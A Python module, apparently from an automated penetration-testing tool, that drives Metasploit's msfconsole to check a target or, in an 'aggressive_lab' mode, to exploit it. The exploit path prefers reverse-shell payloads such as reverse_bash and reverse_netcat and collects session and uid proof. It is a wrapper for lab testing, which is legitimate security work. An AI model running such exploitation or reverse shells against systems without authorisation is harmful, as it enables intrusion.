from __future__ import annotations

import re
import shutil
import subprocess
import time
from typing import Any

from .metasploit_planner import plan_metasploit_execution


CHECK_VULNERABLE_PATTERNS = [
    r"appears to be vulnerable",
    r"is vulnerable",
    r"check\s+appears",
]

CHECK_SAFE_PATTERNS = [
    r"does not appear to be vulnerable",
    r"is not exploitable",
    r"safe",
]


def run_metasploit_module(
    target: str,
    capability: dict[str, Any],
    *,
    execution_mode: str,
    action: str = "check",
    timeout: int = 180,
) -> dict[str, Any]:
    plan = plan_metasploit_execution(
        capability,
        capability.get("matched_service") or {},
    )
    options = {
        **(plan.get("options") or {}),
        "RHOSTS": target,
    }
    action = action if action in {"plan", "check", "exploit"} else "check"
    if execution_mode != "aggressive_lab" or action == "plan":
        return {
            "allowed": True,
            "verified": False,
            "exploited": False,
            "reason": "Metasploit module planned only. Use aggressive_lab mode to run gated Metasploit validation.",
            "metasploit_plan": {**plan, "options": options},
            "proof_goal": "Plan Metasploit module, options, and payload candidates.",
        }

    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        return {
            "allowed": False,
            "verified": False,
            "exploited": False,
            "reason": "msfconsole is not installed or not on PATH.",
            "metasploit_plan": {**plan, "options": options},
        }

    module_path = plan.get("module_path")
    selected_payload = plan.get("selected_payload")
    resource_lines = [f"use {module_path}"]
    if action == "exploit":
        selected_payload = choose_exploit_payload(plan)
        options = {**options, **exploit_payload_options(target, selected_payload)}
    for key, value in options.items():
        if key in {"LHOST", "LPORT"} and selected_payload == "":
            continue
        if value not in {"", None, "auto"}:
            resource_lines.append(f"set {key} {value}")
    if selected_payload:
        resource_lines.append(f"set PAYLOAD {selected_payload}")
    if action == "exploit" and selected_payload == "cmd/unix/generic":
        resource_lines.append("set CMD id")
    if action == "exploit":
        resource_lines.extend(["run -j", "sleep 12", "sessions -l", "sessions -K", "exit -y"])
    else:
        resource_lines.extend(["check", "exit -y"])
    command_text = "; ".join(resource_lines)
    command = [msfconsole, "-q", "-x", command_text]

    started = time.monotonic()
    proc = subprocess.run(command, text=True, capture_output=True, timeout=timeout, check=False)
    elapsed = time.monotonic() - started
    stdout = strip_ansi(proc.stdout)
    stderr = strip_ansi(proc.stderr)
    combined = stdout + "\n" + stderr
    verdict = parse_check_verdict(combined)
    session_created = bool(re.search(r"(command shell|meterpreter) session \d+ opened", combined, re.I))
    command_proof = bool(re.search(r"\buid=\d+.*\bgid=\d+", combined))
    exploited = action == "exploit" and (session_created or command_proof)
    verified = exploited or verdict == "appears_vulnerable"
    return {
        "allowed": True,
        "verified": verified,
        "exploited": exploited,
        "cleanup_verified": "killing all sessions" in combined.lower() or not session_created,
        "reason": exploit_reason(verdict, exploited, session_created) if action == "exploit" else check_reason(verdict),
        "proof_output": first_interesting_line(stdout) if verified else "",
        "proof_goal": (
            "Run Metasploit exploit against an allowlisted isolated lab target and collect session proof."
            if action == "exploit"
            else "Run Metasploit check against an allowlisted lab target; do not execute exploit."
        ),
        "metasploit_plan": {**plan, "options": options},
        "metasploit_check": {
            "command": redact_command(command),
            "returncode": proc.returncode,
            "stdout": stdout[-6000:],
            "stderr": stderr[-3000:],
            "elapsed_seconds": round(elapsed, 3),
            "verdict": verdict,
            "action": action,
            "session_created": session_created,
            "command_proof": command_proof,
        },
    }


def choose_exploit_payload(plan: dict[str, Any]) -> str:
    payloads = [str(item) for item in plan.get("payload_candidates", []) if item]
    selected = str(plan.get("selected_payload") or "")
    for preferred in ["cmd/unix/reverse_bash", "cmd/unix/reverse_netcat", "cmd/unix/generic"]:
        if preferred in payloads:
            return preferred
    return selected


def exploit_payload_options(target: str, payload: str) -> dict[str, str]:
    options: dict[str, str] = {}
    if "reverse" in payload:
        lhost = infer_lhost(target)
        if lhost:
            options["LHOST"] = lhost
        options["LPORT"] = "4445"
    return options


def infer_lhost(target: str) -> str:
    ip = shutil.which("ip")
    if not ip:
        return ""
    proc = subprocess.run([ip, "route", "get", target], text=True, capture_output=True, timeout=5, check=False)
    match = re.search(r"\bsrc\s+(\S+)", proc.stdout)
    return match.group(1) if match else ""


def parse_check_verdict(output: str) -> str:
    lowered = output.lower()
    for pattern in CHECK_SAFE_PATTERNS:
        if re.search(pattern, lowered):
            return "not_vulnerable"
    for pattern in CHECK_VULNERABLE_PATTERNS:
        if re.search(pattern, lowered):
            return "appears_vulnerable"
    if "check failed" in lowered or "unknown" in lowered:
        return "unknown"
    return "no_check_signal"


def check_reason(verdict: str) -> str:
    return {
        "appears_vulnerable": "Metasploit check reported that the target appears vulnerable.",
        "not_vulnerable": "Metasploit check reported that the target does not appear vulnerable.",
        "unknown": "Metasploit check completed without a positive vulnerability signal.",
        "no_check_signal": "Metasploit check did not produce a recognized vulnerability signal.",
    }.get(verdict, "Metasploit check produced an unrecognized result.")


def exploit_reason(verdict: str, exploited: bool, session_created: bool) -> str:
    if exploited and session_created:
        return "Metasploit exploit opened a command or Meterpreter session in the isolated lab and cleanup was attempted."
    if exploited:
        return "Metasploit exploit produced command-execution proof in the isolated lab."
    if verdict == "appears_vulnerable":
        return "Metasploit exploit reached a vulnerable target signal, but no session or command proof was collected."
    return check_reason(verdict)


def first_interesting_line(output: str) -> str:
    for line in output.splitlines():
        lowered = line.lower()
        if "session" in lowered and "opened" in lowered:
            return line.strip()
    for line in output.splitlines():
        if re.search(r"\buid=\d+.*\bgid=\d+", line):
            return line.strip()
    for line in output.splitlines():
        lowered = line.lower()
        if "appears to be vulnerable" in lowered or "is vulnerable" in lowered:
            return line.strip()
    return ""


def strip_ansi(value: str) -> str:
    return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", value)


def redact_command(command: list[str]) -> list[str]:
    return command[:]
